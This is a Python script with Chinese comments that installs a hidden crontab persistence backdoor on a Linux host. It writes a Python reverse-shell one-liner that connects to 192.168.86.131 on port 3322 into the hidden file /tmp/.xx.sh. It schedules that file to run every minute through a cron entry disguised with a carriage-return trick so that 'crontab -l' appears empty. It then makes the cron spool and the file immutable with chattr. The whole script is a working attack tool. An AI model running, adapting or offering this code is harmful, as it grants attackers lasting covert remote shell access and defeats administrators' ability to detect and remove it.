# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import os

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def etc_crontab(shell, file_path):
    with open(file_path, 'w') as file:
        file.write(shell)

    command = '(crontab -l;printf "*/1 * * * * ' + ' /bin/bash ' + file_path + ';/bin/bash --noprofile -i;\\rno crontab for `whoami` %100c\\n")|crontab -'
    ml(command)


def xt(file_path):
    command = 'chattr +i /var/spool/cron/'
    ml(command)
    command = 'chattr +i ' + file_path
    ml(command)

def check_sshkey(file_path):
    if os.path.exists(file_path):
        print("Yes----crontab计划任务后门")
    else:
        print("No----crontab计划任务后门")

if __name__ == '__main__':
    # https://taoyuan.cool/shell/在这个网站获取反弹shell语句写在下面，注意，下面语句如果有双引号，请加上\\"进行转义，下面语句也可以在计划任务中，执行某个命令
    shell = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.86.131",3322));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"""
    file_path = "/tmp/.xx.sh"
    etc_crontab(shell, file_path)
    command = 'chmod + x ' + file_path
    ml(command)
    xt(file_path)
    check_sshkey(file_path)
